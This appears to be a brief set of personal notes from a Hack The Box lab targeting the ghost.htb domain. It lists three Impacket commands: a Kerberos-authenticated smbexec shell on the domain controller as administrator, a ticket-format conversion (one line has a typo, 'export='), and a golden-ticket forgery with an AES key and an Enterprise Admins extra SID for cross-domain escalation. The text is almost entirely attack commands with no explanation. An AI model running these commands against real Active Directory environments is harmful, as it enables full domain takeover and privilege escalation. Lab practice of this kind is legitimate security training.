

## SMBExec
```
impacket-smbexec -k -no-pass -dc-ip 10.10.11.24 CORP.GHOST.HTB/administrator@dc01.ghost.htb
```

## TicketConvertor
```
ticketConverter.py /PATH/ticket.kirbi ticket.ccache
export=KRB5CCNAME=/PATH/ticket.ccache
```

## Ticketer
```
impacket-ticketer -aesKey b0eb79f35055af9d61bcbbe8ccae81d98cf63215045f7216ffd1f8e009a75e8d -domain-sid S-1-5-21-2034262909-2733679486-179904498 -extra-sid S-1-5-21-4084500788-938703357-3654145966-519 -domain corp.ghost.htb administrator
```